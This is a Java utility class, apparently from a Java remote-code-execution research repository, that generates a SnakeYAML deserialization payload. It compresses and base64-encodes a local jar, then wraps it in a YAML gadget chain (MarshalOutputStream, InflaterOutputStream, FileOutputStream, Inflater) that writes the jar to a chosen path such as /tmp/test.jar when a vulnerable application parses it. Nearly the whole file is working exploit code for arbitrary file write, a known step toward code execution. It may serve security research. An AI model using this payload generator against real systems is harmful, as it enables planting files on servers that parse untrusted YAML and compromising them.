package com.ppp;

import sun.misc.BASE64Encoder;

import java.io.*;
import java.util.zip.Deflater;

/**
 * @author Whoopsunix
 */
public class Utils {
    public static void main(String[] args) throws Exception {
        String str = create("/Users/ppp/Documents/pppRepository/github_file/JavaRce/Serialization/SnakeyamlDemo/target/SnakeyamlDemo-1.0.jar", "/tmp/test.jar");
    }

    public static String create(String SrcPath, String Destpath) throws Exception {
        File file = new File(SrcPath);
        Long FileLength = file.length();
        byte[] FileContent = new byte[FileLength.intValue()];
        try {
            FileInputStream in = new FileInputStream(file);
            in.read(FileContent);
            in.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }
        byte[] compressbytes = compress(FileContent);
        String base64str = base64encoder(compressbytes);
        String poc = "!!sun.rmi.server.MarshalOutputStream [!!java.util.zip.InflaterOutputStream [!!java.io.FileOutputStream [!!java.io.File [\"" + Destpath + "\"],false],!!java.util.zip.Inflater  { input: !!binary " + base64str + " },1048576]]";
        System.out.println(poc);
        return poc;
    }

    public static String base64encoder(byte[] bytes) throws Exception {
        String base64str = new sun.misc.BASE64Encoder().encode(bytes);
        base64str = base64str.replaceAll("\n|\r", "");
        return base64str;
    }

    public static byte[] compress(byte[] data) {
        byte[] output = new byte[0];

        Deflater compresser = new Deflater();

        compresser.reset();
        compresser.setInput(data);
        compresser.finish();
        ByteArrayOutputStream bos = new ByteArrayOutputStream(data.length);
        try {
            byte[] buf = new byte[1024];
            while (!compresser.finished()) {
                int i = compresser.deflate(buf);
                bos.write(buf, 0, i);
            }
            output = bos.toByteArray();
        } catch (Exception e) {
            output = data;
            e.printStackTrace();
        } finally {
            try {
                bos.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        compresser.end();
        return output;
    }
}
